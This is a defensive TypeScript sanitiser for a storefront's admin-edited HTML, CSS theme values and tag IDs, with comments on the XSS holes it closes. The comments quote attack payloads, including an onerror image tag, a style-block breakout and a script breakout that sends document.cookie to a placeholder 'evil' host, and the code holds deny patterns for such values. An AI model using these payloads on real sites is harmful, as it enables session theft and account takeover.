/* HTML + CSS + tag-id sanitising, with no third-party dependency.

   WHY THIS FILE EXISTS
   --------------------
   Three admin-editable values were interpolated straight into markup that every
   visitor's browser parses:

     · Category.sizeChart → dangerouslySetInnerHTML on the public product page,
       completely unfiltered. Any account with the "categories" permission could
       store `<img src=x onerror=…>` and run script on the storefront for every
       shopper — then read `sz_admin_token` out of localStorage when an admin
       browsed, turning a limited staff account into a full SUPER_ADMIN takeover.
     · settings.theme.{bg,text,accent,fonts,…} → raw inside a <style> block on every
       page. A value of `red}</style><script>…` breaks out of the style element.
     · settings.integrations.gtmId → raw inside an inline <script> on every page.
       A value of `');fetch('//evil/'+document.cookie);//` breaks out of the string.

   None of these are stopped by the CSP in next.config.mjs: script-src keeps
   'unsafe-inline' (and the header is Report-Only unless CSP_ENFORCE=1), so inline
   payloads execute today.

   The HTML path is a strict allow-list REBUILDER, not a block-list stripper. Every
   tag and attribute in the output is re-serialised from parsed values, so malformed
   quoting, nested comments and mutation-XSS tricks cannot smuggle anything through —
   anything not explicitly allowed simply never reaches the output.

   Server-side only (pure string work, no DOM), so sanitising happens before the
   value is put into a client-component prop: the raw HTML never reaches the browser. */

/* ------------------------------------------------------------------ tokenizer */

type Attr = { name: string; value: string };
type Token =
  | { kind: "text"; value: string }
  | { kind: "open"; name: string; attrs: Attr[]; selfClosing: boolean }
  | { kind: "close"; name: string };

/* Read one attribute value starting at i. Handles single/double/unquoted forms. */
function readAttrValue(src: string, i: number): [string, number] {
  const q = src[i];
  if (q === '"' || q === "'") {
    const end = src.indexOf(q, i + 1);
    if (end === -1) return [src.slice(i + 1), src.length];
    return [src.slice(i + 1, end), end + 1];
  }
  let j = i;
  /* An unquoted value runs to whitespace or the end of the tag. "/" is NOT a terminator
     here — it used to be, which made `content=0;url=https://evil.example` return an empty
     value with next === i. The caller then re-entered its loop pointing at that same "/",
     made no progress, and spun forever: one malformed sizeChart value hung the product
     page indefinitely. This matches HTML5 (an unquoted value may contain "/") and removes
     the stall. */
  while (j < src.length && !/[\s>]/.test(src[j])) j++;
  /* Forward progress is a hard requirement: next must be > i or the caller can loop. */
  return [src.slice(i, j), Math.max(j, i + 1)];
}

function tokenize(src: string): Token[] {
  const out: Token[] = [];
  let i = 0;
  let textStart = 0;

  const flushText = (end: number) => {
    if (end > textStart) out.push({ kind: "text", value: src.slice(textStart, end) });
  };

  while (i < src.length) {
    if (src[i] !== "<") { i++; continue; }

    // comment / CDATA / doctype / processing instruction — dropped entirely.
    if (src.startsWith("<!--", i)) {
      const end = src.indexOf("-->", i + 4);
      flushText(i);
      i = end === -1 ? src.length : end + 3;
      textStart = i;
      continue;
    }
    if (src.startsWith("<!", i) || src.startsWith("<?", i)) {
      const end = src.indexOf(">", i);
      flushText(i);
      i = end === -1 ? src.length : end + 1;
      textStart = i;
      continue;
    }

    const isClose = src[i + 1] === "/";
    const nameStart = isClose ? i + 2 : i + 1;
    let j = nameStart;
    while (j < src.length && /[a-zA-Z0-9:-]/.test(src[j])) j++;
    const name = src.slice(nameStart, j).toLowerCase();

    // A "<" that is not a tag (e.g. "a < b") — treat as literal text.
    if (!name) { i++; continue; }

    // Find the end of this tag, honouring quoted attribute values so a ">" inside
    // an attribute cannot terminate the tag early.
    let k = j;
    let selfClosing = false;
    const attrs: Attr[] = [];
    while (k < src.length) {
      const ch = src[k];
      if (ch === ">") { k++; break; }
      if (ch === "/" && src[k + 1] === ">") { selfClosing = true; k += 2; break; }
      if (/\s/.test(ch)) { k++; continue; }
      /* A "/" that is not part of "/>" is a separator, exactly as a browser treats it —
         which is why `<img/src=x/onerror=…>` and `<svg/onload=…>` execute. The attribute
         scan below excludes "/" from a name, so without this branch a stray "/" produced
         an empty name, left k where it was, and the loop spun forever. Skipping it both
         matches real parsing and guarantees progress. */
      if (ch === "/") { k++; continue; }
      // attribute name
      let a = k;
      while (a < src.length && !/[\s=/>]/.test(src[a])) a++;
      const attrName = src.slice(k, a).toLowerCase();
      /* Second, unconditional progress guarantee. The scan above stops at "=", so a === k
         is reachable for input like `<div =foo>`; that case is handled by the "=" branch,
         but anything else must still advance or this loop cannot terminate. A parser that
         can hang is itself a denial-of-service vector, independent of what it emits. */
      if (a === k && src[k] !== "=") { k++; continue; }
      k = a;
      while (k < src.length && /\s/.test(src[k])) k++;
      if (src[k] === "=") {
        k++;
        while (k < src.length && /\s/.test(src[k])) k++;
        const [value, next] = readAttrValue(src, k);
        if (attrName) attrs.push({ name: attrName, value });
        k = Math.max(next, k + 1);
      } else if (attrName) {
        attrs.push({ name: attrName, value: "" });
      }
    }

    flushText(i);
    out.push(isClose ? { kind: "close", name } : { kind: "open", name, attrs, selfClosing });
    /* The outer loop must advance too: if a degenerate tag left k at or before i, step
       past one character rather than re-reading the same "<" forever. */
    i = k > i ? k : i + 1;
    textStart = i;
  }
  flushText(src.length);
  return out;
}

/* ----------------------------------------------------------------- allow-list */

/* Tags whose CONTENT must disappear too, not just the tag itself: their bodies are
   parsed by a different engine (script/style) or open an mXSS path (svg/math/template). */
const DROP_CONTENT = new Set([
  "script", "style", "iframe", "frame", "frameset", "object", "embed", "applet",
  "svg", "math", "template", "noscript", "noembed", "noframes", "xmp", "plaintext",
  "link", "meta", "base", "form", "input", "button", "select", "textarea", "option",
]);

/* Tags we re-emit. Anything else is unwrapped (tag dropped, children kept). */
const ALLOWED_TAGS = new Set([
  "table", "thead", "tbody", "tfoot", "tr", "td", "th", "caption", "colgroup", "col",
  "p", "div", "span", "br", "hr", "strong", "b", "em", "i", "u", "s", "small", "sub", "sup",
  "ul", "ol", "li", "dl", "dt", "dd",
  "h1", "h2", "h3", "h4", "h5", "h6",
  "a", "img", "figure", "figcaption", "blockquote", "code", "pre",
]);

const VOID_TAGS = new Set(["br", "hr", "img", "col"]);

/* Attribute allow-list per tag, plus the global set. Deliberately small: a size chart
   is a table with a few bold cells — it does not need id, style, data- attributes or
   event handlers, and none of those are accepted here. */
const GLOBAL_ATTRS = new Set(["title", "lang", "dir", "align", "valign", "class"]);
const TAG_ATTRS: Record<string, Set<string>> = {
  table: new Set(["border", "cellpadding", "cellspacing", "width", "summary"]),
  td: new Set(["colspan", "rowspan", "width", "height", "abbr", "headers"]),
  th: new Set(["colspan", "rowspan", "width", "height", "scope", "abbr", "headers"]),
  col: new Set(["span", "width"]),
  colgroup: new Set(["span", "width"]),
  a: new Set(["href", "target", "rel"]),
  img: new Set(["src", "alt", "width", "height", "loading"]),
  ol: new Set(["start", "type"]),
};

/* Schemes that may appear in href/src. Everything else (javascript:, data:text/html,
   vbscript:, blob:, and scheme-relative //evil.com) is rejected. */
function safeUrl(raw: string): string | null {
  const value = String(raw || "").trim();
  if (!value || value.length > 2048) return null;
  // Control characters and NULs are used to smuggle "java\0script:" past naive checks.
  if (/[\u0000-\u001f\u007f]/.test(value)) return null;
  const compact = value.replace(/[\s\u0000-\u001f]/g, "").toLowerCase();
  if (compact.startsWith("javascript:") || compact.startsWith("vbscript:") ||
      compact.startsWith("data:") || compact.startsWith("blob:") ||
      compact.startsWith("file:") || compact.startsWith("//")) return null;
  if (/^[a-z][a-z0-9+.-]*:/.test(compact)) {
    // An absolute URL — only http(s), mailto and tel are acceptable.
    if (!/^(https?:|mailto:|tel:)/.test(compact)) return null;
  }
  return value;
}

/* Numeric-ish HTML dimension: 600, 100%, 12.5 — nothing else. */
function safeDimension(raw: string): string | null {
  const value = String(raw || "").trim();
  return /^\d{1,5}(\.\d{1,3})?%?$/.test(value) ? value : null;
}

function safeClass(raw: string): string | null {
  const value = String(raw || "").trim();
  if (!value || value.length > 200) return null;
  // spaces separate class names; no quotes, brackets or angle brackets may survive.
  return /^[a-zA-Z0-9_ -]+$/.test(value) ? value : null;
}

function escapeText(raw: string): string {
  return raw.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
}

function escapeAttr(raw: string): string {
  return raw.replace(/&/g, "&amp;").replace(/"/g, "&quot;")
            .replace(/</g, "&lt;").replace(/>/g, "&gt;");
}

function serializeTag(name: string, attrs: Attr[], selfClosing: boolean): string {
  const allowed = new Set([...(TAG_ATTRS[name] || []), ...GLOBAL_ATTRS]);
  const parts: string[] = [];
  let hasTarget = false;

  for (const { name: attr, value } of attrs) {
    if (!allowed.has(attr)) continue;

    if (attr === "href" || attr === "src") {
      const url = safeUrl(value);
      if (url === null) continue;
      parts.push(`${attr}="${escapeAttr(url)}"`);
      continue;
    }
    if (attr === "width" || attr === "height") {
      const dim = safeDimension(value);
      if (dim === null) continue;
      parts.push(`${attr}="${escapeAttr(dim)}"`);
      continue;
    }
    if (attr === "class") {
      const cls = safeClass(value);
      if (cls === null) continue;
      parts.push(`class="${escapeAttr(cls)}"`);
      continue;
    }
    if (attr === "colspan" || attr === "rowspan" || attr === "span" || attr === "start") {
      if (!/^\d{1,4}$/.test(value)) continue;
      parts.push(`${attr}="${escapeAttr(value)}"`);
      continue;
    }
    if (attr === "target") {
      // Only _blank is meaningful here, and it must never open a window that can
      // reach back into the opener (tabnabbing).
      if (value.trim() !== "_blank") continue;
      hasTarget = true;
      parts.push('target="_blank"');
      continue;
    }
    if (attr === "rel") continue; // rebuilt below, never taken from the input
    if (attr === "loading") {
      if (value !== "lazy" && value !== "eager") continue;
      parts.push(`loading="${value}"`);
      continue;
    }
    // Everything else in the allow-list is a fixed vocabulary word.
    const v = String(value).trim().slice(0, 80);
    if (!/^[a-zA-Z0-9_. -]*$/.test(v)) continue;
    parts.push(v ? `${attr}="${escapeAttr(v)}"` : attr);
  }

  if (name === "a" && hasTarget) parts.push('rel="noopener noreferrer"');
  return `<${name}${parts.length ? " " + parts.join(" ") : ""}${selfClosing || VOID_TAGS.has(name) ? " /" : ""}>`;
}

/* ------------------------------------------------------------------- public API */

export type SanitizeOptions = {
  /** Extra class injected into the first <table>, replacing the old regex hack. */
  tableClass?: string;
  /** Hard cap on input size — a huge paste must not become a CPU sink. */
  maxInputLength?: number;
};

/* Sanitise admin-authored HTML (size charts today). Returns null when there is
   nothing worth rendering, so callers can skip the block instead of emitting "". */
export function sanitizeHtml(input: unknown, options: SanitizeOptions = {}): string | null {
  if (typeof input !== "string") return null;
  const max = options.maxInputLength ?? 200_000;
  const src = input.length > max ? input.slice(0, max) : input;
  if (!src.trim()) return null;

  const tokens = tokenize(src);
  const out: string[] = [];
  // Stack of open DROP_CONTENT tags whose body we are discarding.
  const skipDepth: string[] = [];
  let tableClassApplied = false;

  for (const token of tokens) {
    if (skipDepth.length) {
      if (token.kind === "open" && DROP_CONTENT.has(token.name) && !token.selfClosing) skipDepth.push(token.name);
      else if (token.kind === "close" && token.name === skipDepth[skipDepth.length - 1]) skipDepth.pop();
      continue; // inside a script/style/svg body — emit nothing
    }

    if (token.kind === "text") {
      out.push(escapeText(token.value));
      continue;
    }

    if (DROP_CONTENT.has(token.name)) {
      // Void-ish dangerous tags (link/meta/base/input…) have no body to skip.
      if (token.kind === "open" && !token.selfClosing &&
          !["link", "meta", "base", "input", "form"].includes(token.name)) {
        skipDepth.push(token.name);
      }
      continue;
    }

    if (!ALLOWED_TAGS.has(token.name)) continue; // unwrap: keep children, drop the tag

    if (token.kind === "close") {
      out.push(VOID_TAGS.has(token.name) ? "" : `</${token.name}>`);
      continue;
    }

    let attrs = token.attrs;
    if (token.name === "table" && options.tableClass && !tableClassApplied) {
      tableClassApplied = true;
      const existing = attrs.find((a) => a.name === "class");
      const merged = existing ? `${options.tableClass} ${existing.value}` : options.tableClass;
      attrs = [...attrs.filter((a) => a.name !== "class"), { name: "class", value: merged }];
    }
    out.push(serializeTag(token.name, attrs, token.selfClosing));
  }

  const html = out.join("").replace(/(?:\s*\n){3,}/g, "\n\n").trim();
  return html || null;
}

/* ------------------------------------------------------------------ CSS values */

/* A CSS value that cannot terminate its declaration or its <style> element.
   Blocks `;`, `{`, `}`, `<`, `>`, quotes, backslash, comments and url() — which
   covers both the `red}</style><script>` breakout and `url(//evil)` beaconing. */
const CSS_VALUE_OK = /^[a-zA-Z0-9#%,.()\s/+_-]{1,120}$/;
const CSS_VALUE_BAD = /[<>{};'"\\]|\/\*|\*\//;

/* The charset above has to keep `(`, `)`, `/` and `.` so that rgb()/hsl() and
   slash-separated ratios stay usable — which means a few function-shaped values get
   through on syntax alone. These are the ones that matter:

     url(//evil.example.com/x)   no colon, so the charset accepts it; a background
                                 image is a silent beacon that leaks the visitor's IP
                                 and User-Agent to an arbitrary host on every page view.
     expression(…)               legacy IE CSS-to-JS; dead in modern browsers but free
                                 to reject.
     -moz-binding / behavior     the same idea in other engines.

   A theme colour or font stack never needs any of them, so they are refused outright
   rather than escaped. */
const CSS_VALUE_DENY = /url\s*\(|expression\s*\(|-moz-binding|behavior\s*:|javascript|@import/i;

export function safeCssValue(input: unknown, fallback = ""): string {
  const value = String(input ?? "").trim();
  if (!value || value.length > 120) return fallback;
  if (CSS_VALUE_BAD.test(value)) return fallback;
  if (CSS_VALUE_DENY.test(value)) return fallback;
  return CSS_VALUE_OK.test(value) ? value : fallback;
}

/* Font stacks are comma-separated family names. Quotes are stripped rather than
   allowed, because a quote is exactly what closes an attribute or a style block. */
export function safeCssFontStack(input: unknown, fallback = ""): string {
  const value = String(input ?? "").trim();
  if (!value || value.length > 160) return fallback;
  if (CSS_VALUE_BAD.test(value)) return fallback;
  if (CSS_VALUE_DENY.test(value)) return fallback;
  if (!/^[a-zA-Z0-9,\s_-]+$/.test(value)) return fallback;
  return value;
}

/* A plain integer for px-valued settings (radius, container width). */
export function safeCssInteger(input: unknown, fallback = ""): string {
  const n = Number(input);
  if (!Number.isFinite(n) || n < 0 || n > 100000) return fallback;
  return String(Math.round(n));
}

/* ------------------------------------------------------------------ tag ids */

/* Google tag identifiers have rigid shapes. Validating them is what keeps gtmId
   out of the inline <script> as executable code. */
const TAG_ID_PATTERNS = [
  /^GTM-[A-Z0-9]{4,12}$/,      // Tag Manager
  /^G-[A-Z0-9]{6,14}$/,        // GA4
  /^AW-\d{6,14}$/,             // Google Ads
  /^UA-\d{4,10}-\d{1,4}$/,     // legacy Analytics
  /^DC-[A-Z0-9]{4,12}$/,       // Floodlight
  /^MC-[A-Z0-9]{4,12}$/,
];

export function safeGoogleTagId(input: unknown): string {
  const value = String(input ?? "").trim().toUpperCase();
  if (!value || value.length > 24) return "";
  return TAG_ID_PATTERNS.some((re) => re.test(value)) ? value : "";
}

/* Meta Pixel / CAPI ids are numeric. */
export function safeNumericId(input: unknown): string {
  const value = String(input ?? "").trim();
  return /^\d{1,25}$/.test(value) ? value : "";
}

/* Aspect ratio written as "3:4" in settings, rendered as "3 / 4" in CSS. */
export function safeAspectRatio(input: unknown, fallback = "3 / 4"): string {
  const value = String(input ?? "").trim();
  const m = /^(\d{1,4})\s*[:/x]\s*(\d{1,4})$/.exec(value);
  if (!m) return fallback;
  const w = Number(m[1]);
  const h = Number(m[2]);
  if (!w || !h || w > 100 || h > 100) return fallback;
  return `${w} / ${h}`;
}
